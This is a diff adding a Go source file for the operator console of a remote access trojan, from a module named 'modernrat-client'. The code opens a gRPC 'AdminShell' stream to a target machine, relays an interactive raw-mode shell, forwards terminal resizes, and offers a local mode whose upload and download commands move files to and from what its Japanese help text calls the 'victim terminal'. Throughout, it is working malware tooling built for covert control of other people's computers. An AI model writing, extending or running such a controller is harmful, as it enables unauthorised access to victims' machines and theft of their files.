@@ -1,0 +1,740 @@
+package main
+
+import (
+	"context"
+	"errors"
+	"fmt"
+	"io"
+	"log"
+	"os"
+	"os/signal"
+	"path/filepath"
+	"sort"
+	"strings"
+	"sync"
+	"syscall"
+	"unicode"
+
+	pb "modernrat-client/gen"
+
+	"github.com/chzyer/readline"
+	"golang.org/x/term"
+	"google.golang.org/grpc/metadata"
+)
+
+type adminSession struct {
+	stream    pb.RemoteShellService_AdminShellClient
+	userID    string
+	sessionID string
+	app       *adminApp
+
+	termState *term.State
+	rawMode   bool
+
+	ctx        context.Context
+	cancel     context.CancelFunc
+	sendMu     sync.Mutex
+	sendClosed bool
+	sigCh      chan os.Signal
+
+	ttyIn   *os.File
+	ttyFD   int
+	stdinWG sync.WaitGroup
+
+	closed sync.Once
+}
+
+func (a *adminApp) runShell(userID string) error {
+	md := metadata.New(map[string]string{"authorization": "Bearer " + a.token})
+	ctxWithToken := metadata.NewOutgoingContext(a.ctx, md)
+
+	stream, err := a.shellClient.AdminShell(ctxWithToken)
+	if err != nil {
+		return fmt.Errorf("AdminShell ストリーム開始失敗: %w", err)
+	}
+	session := newAdminSession(a, ctxWithToken, stream, userID)
+	defer session.close()
+
+	cols, rows := int32(0), int32(0)
+	if w, h, err := term.GetSize(int(os.Stdout.Fd())); err == nil {
+		cols, rows = int32(w), int32(h)
+	}
+
+	openMsg := &pb.ShellMessage{
+		Type:   pb.ShellMessageType_SHELL_MESSAGE_TYPE_OPEN,
+		UserId: userID,
+		Text:   "admin shell request",
+		Cols:   cols,
+		Rows:   rows,
+	}
+	if err := session.safeSend(openMsg); err != nil {
+		return fmt.Errorf("OPEN 送信失敗: %w", err)
+	}
+
+	return session.receiveLoop()
+}
+
+func (s *adminSession) receiveLoop() error {
+	readerStarted := false
+	resizeWatcherStarted := false
+	instructionsShown := false
+
+	for {
+		msg, err := s.stream.Recv()
+		if err != nil {
+			if errors.Is(err, io.EOF) {
+				return nil
+			}
+			return fmt.Errorf("AdminShell 受信エラー: %w", err)
+		}
+
+		switch msg.GetType() {
+		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_OPEN:
+			s.sessionID = msg.GetSessionId()
+			log.Printf("セッション開始: session=%s", s.sessionID)
+
+		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_ACCEPTED:
+			if msg.GetSessionId() != "" {
+				s.sessionID = msg.GetSessionId()
+			}
+			log.Printf("クライアントがシェルを開始しました (session=%s)", s.sessionID)
+
+			if !readerStarted {
+				readerStarted = true
+				if err := s.enableRawMode(); err != nil {
+					log.Printf("警告: raw mode 設定に失敗しました: %v", err)
+				}
+				s.stdinWG.Add(1)
+				go func(sessionID string) {
+					defer s.stdinWG.Done()
+					if err := s.stdinLoop(sessionID); err != nil {
+						if !errors.Is(err, io.EOF) {
+							log.Printf("STDIN 送信エラー: %v", err)
+						}
+						s.closeSession("stdin error")
+					}
+				}(s.sessionID)
+			}
+
+			if !resizeWatcherStarted {
+				resizeWatcherStarted = true
+				go s.watchResize()
+			}
+
+			if !instructionsShown {
+				instructionsShown = true
+				fmt.Fprint(os.Stderr, "\r\n[local] 行頭で ':' を入力するとローカルコマンド (upload/download) を実行できます。\n")
+			}
+
+		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_STDOUT:
+			if _, err := os.Stdout.Write(msg.GetData()); err != nil {
+				return fmt.Errorf("STDOUT 書き込みに失敗: %w", err)
+			}
+
+		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_STDERR:
+			if _, err := os.Stderr.Write(msg.GetData()); err != nil {
+				return fmt.Errorf("STDERR 書き込みに失敗: %w", err)
+			}
+
+		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_ERROR:
+			return fmt.Errorf("セッションエラー: %s", msg.GetText())
+
+		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_CLOSE:
+			fmt.Fprintf(os.Stderr, "\n[session closed] exit_code=%d reason=%s\n", msg.GetExitCode(), msg.GetText())
+			return nil
+
+		default:
+			log.Printf("未知のメッセージタイプ: %v", msg.GetType())
+		}
+	}
+}
+
+func (s *adminSession) watchResize() {
+	if s.sessionID == "" {
+		return
+	}
+
+	s.sigCh = make(chan os.Signal, 1)
+	signal.Notify(s.sigCh, syscall.SIGWINCH)
+	defer func() {
+		signal.Stop(s.sigCh)
+		close(s.sigCh)
+	}()
+
+	sendSize := func() {
+		w, h, err := term.GetSize(int(os.Stdout.Fd()))
+		if err != nil || w <= 0 || h <= 0 {
+			return
+		}
+		_ = s.safeSend(&pb.ShellMessage{
+			Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_RESIZE,
+			SessionId: s.sessionID,
+			UserId:    s.userID,
+			Cols:      int32(w),
+			Rows:      int32(h),
+		})
+	}
+
+	sendSize()
+
+	for {
+		select {
+		case <-s.ctx.Done():
+			return
+		case _, ok := <-s.sigCh:
+			if !ok {
+				return
+			}
+			sendSize()
+		}
+	}
+}
+
+func (s *adminSession) stdinLoop(sessionID string) error {
+	if sessionID == "" {
+		return errors.New("session id not initialized")
+	}
+
+	reader := s.inputFile()
+	buf := make([]byte, 4096)
+	var remoteBuf []byte
+	lineBuf := make([]byte, 0, 128)
+	lineHasNonSpace := false
+
+	const (
+		escStateNone = iota
+		escStateStart
+		escStateCSI
+		escStateOSC
+		escStateOSCExit
+	)
+	escapeState := escStateNone
+
+	flushRemote := func() error {
+		if len(remoteBuf) == 0 {
+			return nil
+		}
+		chunk := append([]byte(nil), remoteBuf...)
+		remoteBuf = remoteBuf[:0]
+		if sendErr := s.safeSend(&pb.ShellMessage{
+			Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_STDIN,
+			SessionId: sessionID,
+			UserId:    s.userID,
+			Data:      chunk,
+		}); sendErr != nil {
+			return sendErr
+		}
+		return nil
+	}
+
+	for {
+		select {
+		case <-s.ctx.Done():
+			return nil
+		default:
+		}
+
+		n, err := reader.Read(buf)
+		if n > 0 {
+			for i := 0; i < n; i++ {
+				b := buf[i]
+
+				switch escapeState {
+				case escStateNone:
+					if b == 0x1b {
+						escapeState = escStateStart
+						continue
+					}
+				case escStateStart:
+					switch b {
+					case '[':
+						escapeState = escStateCSI
+					case ']':
+						escapeState = escStateOSC
+					default:
+						escapeState = escStateNone
+					}
+					continue
+				case escStateCSI:
+					if b >= 0x40 && b <= 0x7e {
+						escapeState = escStateNone
+					}
+					continue
+				case escStateOSC:
+					if b == 0x07 {
+						escapeState = escStateNone
+						continue
+					}
+					if b == 0x1b {
+						escapeState = escStateOSCExit
+					}
+					continue
+				case escStateOSCExit:
+					if b == '\\' {
+						escapeState = escStateNone
+					} else {
+						escapeState = escStateOSC
+					}
+					continue
+				}
+
+				if !lineHasNonSpace && len(lineBuf) == 0 && b == ':' {
+					if err := flushRemote(); err != nil {
+						return err
+					}
+					if err := s.handleLocalCommandMode(sessionID); err != nil {
+						if errors.Is(err, context.Canceled) {
+							return err
+						}
+						if err != nil {
+							fmt.Fprintf(os.Stderr, "ローカルコマンドエラー: %v\n", err)
+						}
+					}
+					lineBuf = lineBuf[:0]
+					lineHasNonSpace = false
+					continue
+				}
+
+				remoteBuf = append(remoteBuf, b)
+				if b == '\n' || b == '\r' {
+					lineBuf = lineBuf[:0]
+					lineHasNonSpace = false
+				} else {
+					lineBuf = append(lineBuf, b)
+					if b != ' ' && b != '\t' {
+						lineHasNonSpace = true
+					}
+				}
+			}
+			if err := flushRemote(); err != nil {
+				return err
+			}
+		}
+
+		if err != nil {
+			if errors.Is(err, io.EOF) {
+				_ = flushRemote()
+				return s.safeSend(&pb.ShellMessage{
+					Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_CLOSE,
+					SessionId: sessionID,
+					UserId:    s.userID,
+					Text:      "stdin closed",
+				})
+			}
+			if errors.Is(err, os.ErrClosed) {
+				return nil
+			}
+			return err
+		}
+	}
+}
+
+func (s *adminSession) handleLocalCommandMode(sessionID string) error {
+	fmt.Fprint(os.Stdout, "\r\n[local mode] upload/download コマンドを使用できます。空行で終了します。\n")
+
+	wasRaw := s.rawMode
+	if wasRaw {
+		s.restoreTerminal()
+	}
+
+	defer func() {
+		if wasRaw {
+			if err := s.enableRawMode(); err != nil {
+				log.Printf("警告: raw mode の再設定に失敗しました: %v", err)
+			}
+		}
+	}()
+
+	completer := newDynamicAutoCompleter(func(line string) []string {
+		return s.localCommandSuggestions(line)
+	})
+
+	rl, err := readline.NewEx(&readline.Config{
+		Prompt:          "local> ",
+		AutoComplete:    completer,
+		InterruptPrompt: "^C",
+		HistoryLimit:    256,
+	})
+	if err != nil {
+		return err
+	}
+	defer rl.Close()
+
+	var exitLinePrinted bool
+	for {
+		if err := s.ctx.Err(); err != nil {
+			return err
+		}
+
+		line, err := rl.Readline()
+		if err != nil {
+			if errors.Is(err, io.EOF) || err == readline.ErrInterrupt {
+				fmt.Fprintln(os.Stdout)
+				exitLinePrinted = true
+				break
+			}
+			return err
+		}
+
+		line = strings.TrimSpace(line)
+		if line == "" {
+			break
+		}
+		if strings.EqualFold(line, "exit") || strings.EqualFold(line, "quit") {
+			break
+		}
+		if strings.EqualFold(line, "help") {
+			s.printLocalHelp()
+			continue
+		}
+
+		if err := s.executeLocalCommand(line); err != nil {
+			fmt.Fprintf(os.Stderr, "エラー: %v\n", err)
+			continue
+		}
+
+		rl.SaveHistory(line)
+	}
+
+	if !exitLinePrinted {
+		fmt.Fprintln(os.Stdout)
+	}
+
+	return s.safeSend(&pb.ShellMessage{
+		Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_STDIN,
+		SessionId: sessionID,
+		UserId:    s.userID,
+		Data:      []byte("\r"),
+	})
+}
+
+func (s *adminSession) printLocalHelp() {
+	fmt.Println("利用可能なローカルコマンド:")
+	fmt.Println("  upload <local> [remote]  - ローカルファイルを被害端末へ送信")
+	fmt.Println("  download <remote> [local] - 被害端末からローカルに保存")
+	fmt.Println("  help                      - このヘルプを表示")
+	fmt.Println("  exit                      - ローカルモードを終了")
+}
+
+func (s *adminSession) executeLocalCommand(line string) error {
+	args, err := parseArguments(line)
+	if err != nil {
+		return err
+	}
+	if len(args) == 0 {
+		return nil
+	}
+
+	if s.app == nil {
+		return errors.New("admin app が初期化されていません")
+	}
+
+	switch strings.ToLower(args[0]) {
+	case "upload":
+		if len(args) < 2 {
+			return errors.New("使用方法: upload <local_path> [remote_path]")
+		}
+		localPath, err := expandLocalPath(args[1])
+		if err != nil {
+			return err
+		}
+		remotePath := ""
+		if len(args) >= 3 {
+			remotePath = args[2]
+		}
+		if remotePath == "" {
+			remotePath = filepath.Base(localPath)
+		}
+		fmt.Fprintf(os.Stdout, "[local] uploading %s -> %s\n", localPath, remotePath)
+		if err := s.app.performUpload(s.userID, localPath, remotePath); err != nil {
+			return err
+		}
+		fmt.Fprintln(os.Stdout, "[local] upload complete")
+
+	case "download":
+		if len(args) < 2 {
+			return errors.New("使用方法: download <remote_path> [local_path]")
+		}
+		remotePath := args[1]
+		localPath := ""
+		if len(args) >= 3 {
+			localPath = args[2]
+		}
+		if localPath == "" {
+			localPath = filepath.Base(remotePath)
+		}
+		localPath, err := expandLocalPath(localPath)
+		if err != nil {
+			return err
+		}
+		fmt.Fprintf(os.Stdout, "[local] downloading %s -> %s\n", remotePath, localPath)
+		if err := s.app.performDownload(s.userID, remotePath, localPath); err != nil {
+			return err
+		}
+		fmt.Fprintln(os.Stdout, "[local] download complete")
+
+	default:
+		return fmt.Errorf("未知のローカルコマンドです: %s", args[0])
+	}
+
+	s.app.attachedUser = s.userID
+	s.app.defaultUser = s.userID
+	return nil
+}
+
+func (s *adminSession) localCommandSuggestions(line string) []string {
+	commands := []string{"upload ", "download ", "help", "exit"}
+	trimmed := line
+	hasTrailingSpace := len(trimmed) > 0 && unicode.IsSpace(rune(trimmed[len(trimmed)-1]))
+	fields := strings.Fields(trimmed)
+
+	if len(fields) == 0 {
+		if hasTrailingSpace {
+			return nil
+		}
+		return commands
+	}
+
+	cmd := fields[0]
+	if len(fields) == 1 && !hasTrailingSpace {
+		var matches []string
+		for _, c := range commands {
+			candidate := strings.TrimSpace(c)
+			if strings.HasPrefix(candidate, cmd) {
+				matches = append(matches, c)
+			}
+		}
+		return matches
+	}
+
+	argIndex := len(fields) - 1
+	currentToken := fields[len(fields)-1]
+	prefix := trimmed[:len(trimmed)-len(currentToken)]
+	if hasTrailingSpace {
+		argIndex++
+		currentToken = ""
+		prefix = trimmed
+	}
+
+	switch strings.ToLower(cmd) {
+	case "upload":
+		if argIndex == 1 {
+			return prependPrefix(prefix, pathCompletionCandidates(currentToken))
+		}
+	case "download":
+		if argIndex == 2 {
+			return prependPrefix(prefix, pathCompletionCandidates(currentToken))
+		}
+	}
+
+	return nil
+}
+
+func prependPrefix(prefix string, tokens []string) []string {
+	if len(tokens) == 0 {
+		return nil
+	}
+	results := make([]string, 0, len(tokens))
+	for _, tok := range tokens {
+		results = append(results, prefix+tok)
+	}
+	return results
+}
+
+func pathCompletionCandidates(token string) []string {
+	dirPart, partial := filepath.Split(token)
+	searchDir := dirPart
+	if searchDir == "" {
+		searchDir = "."
+	}
+
+	expandedDir, err := expandLocalPath(searchDir)
+	if err != nil {
+		return nil
+	}
+	if expandedDir == "" {
+		expandedDir = "."
+	}
+
+	entries, err := os.ReadDir(expandedDir)
+	if err != nil {
+		return nil
+	}
+
+	candidates := make([]string, 0, len(entries))
+	for _, entry := range entries {
+		name := entry.Name()
+		if partial != "" && !strings.HasPrefix(name, partial) {
+			continue
+		}
+		candidate := dirPart + name
+		if entry.IsDir() {
+			candidate += string(os.PathSeparator)
+		}
+		candidates = append(candidates, candidate)
+	}
+
+	sort.Strings(candidates)
+	return candidates
+}
+
+func (s *adminSession) closeSession(reason string) {
+	s.closed.Do(func() {
+		if s.sessionID == "" {
+			return
+		}
+		_ = s.safeSend(&pb.ShellMessage{
+			Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_CLOSE,
+			SessionId: s.sessionID,
+			UserId:    s.userID,
+			Text:      reason,
+		})
+	})
+}
+
+func (s *adminSession) enableRawMode() error {
+	fd := s.ensureTTY()
+	if fd == 0 || !term.IsTerminal(fd) {
+		return nil
+	}
+
+	state, err := term.MakeRaw(fd)
+	if err != nil {
+		return err
+	}
+	s.termState = state
+	s.rawMode = true
+	return nil
+}
+
+func (s *adminSession) restoreTerminal() {
+	if !s.rawMode {
+		return
+	}
+
+	fd := s.ttyFD
+	if fd == 0 {
+		fd = int(os.Stdin.Fd())
+	}
+	if s.termState != nil {
+		if err := term.Restore(fd, s.termState); err != nil {
+			log.Printf("警告: 端末状態の復元に失敗しました: %v", err)
+		}
+	}
+
+	s.rawMode = false
+	fmt.Fprint(os.Stderr, "\r\n")
+}
+
+func newAdminSession(app *adminApp, parent context.Context, stream pb.RemoteShellService_AdminShellClient, userID string) *adminSession {
+	ctx, cancel := context.WithCancel(parent)
+	return &adminSession{
+		stream: stream,
+		userID: userID,
+		app:    app,
+		ctx:    ctx,
+		cancel: cancel,
+	}
+}
+
+func (s *adminSession) safeSend(msg *pb.ShellMessage) error {
+	s.sendMu.Lock()
+	if s.sendClosed {
+		s.sendMu.Unlock()
+		return io.EOF
+	}
+
+	err := s.stream.Send(msg)
+	if err != nil {
+		s.sendClosed = true
+	}
+	s.sendMu.Unlock()
+
+	if err != nil && s.cancel != nil {
+		s.cancel()
+	}
+
+	return err
+}
+
+func (s *adminSession) close() {
+	s.sendMu.Lock()
+	if s.sendClosed {
+		s.sendMu.Unlock()
+		return
+	}
+	s.sendClosed = true
+	s.sendMu.Unlock()
+
+	if s.sigCh != nil {
+		signal.Stop(s.sigCh)
+	}
+	if s.ttyIn != nil {
+		_ = s.ttyIn.Close()
+		s.ttyIn = nil
+	}
+	if s.cancel != nil {
+		s.cancel()
+	}
+	_ = s.stream.CloseSend()
+	s.restoreTerminal()
+	s.stdinWG.Wait()
+}
+
+func (s *adminSession) ensureTTY() int {
+	if s.ttyFD != 0 {
+		return s.ttyFD
+	}
+	if tty, err := os.OpenFile("/dev/tty", os.O_RDWR, 0); err == nil {
+		s.ttyIn = tty
+		s.ttyFD = int(tty.Fd())
+		return s.ttyFD
+	}
+	s.ttyFD = int(os.Stdin.Fd())
+	return s.ttyFD
+}
+
+func (s *adminSession) inputFile() *os.File {
+	if s.ensureTTY() != 0 && s.ttyIn != nil {
+		return s.ttyIn
+	}
+	return os.Stdin
+}
+
+type dynamicAutoCompleter struct {
+	handler func(string) []string
+}
+
+func newDynamicAutoCompleter(handler func(string) []string) readline.AutoCompleter {
+	if handler == nil {
+		return nil
+	}
+	return &dynamicAutoCompleter{handler: handler}
+}
+
+func (d *dynamicAutoCompleter) Do(line []rune, pos int) ([][]rune, int) {
+	if d == nil || d.handler == nil {
+		return nil, 0
+	}
+	if pos < 0 {
+		pos = 0
+	}
+	if pos > len(line) {
+		pos = len(line)
+	}
+	prefix := string(line[:pos])
+	suggestions := d.handler(prefix)
+	if len(suggestions) == 0 {
+		return nil, 0
+	}
+	start := pos
+	for start > 0 && !unicode.IsSpace(line[start-1]) {
+		start--
+	}
+	replaceLen := pos - start
+	results := make([][]rune, len(suggestions))
+	for i, suggestion := range suggestions {
+		results[i] = []rune(suggestion)
+	}
+	return results, replaceLen
+}
